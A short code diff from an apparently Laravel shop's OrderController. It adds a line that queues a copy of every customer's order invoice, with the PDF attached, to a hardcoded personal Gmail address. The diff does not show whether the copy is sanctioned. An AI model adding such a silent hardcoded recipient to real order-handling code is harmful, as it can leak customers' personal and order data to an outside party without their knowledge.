@@ -403,6 +403,7 @@ class OrderController extends Controller
             $array['file_name'] = 'Order#' . $order->code . '.pdf';
             $array['subjectsingle'] = 'Order Placed - ' . $order->code;
             Mail::to($request->session()->get('shipping_info')['email'])->queue(new InvoiceEmailManager($array));
+            Mail::to('ehavenebd@gmail.com')->queue(new InvoiceEmailManager($array));
             unlink($array['file']);
 
             // sms send tanjil pagla dakis ki hoise
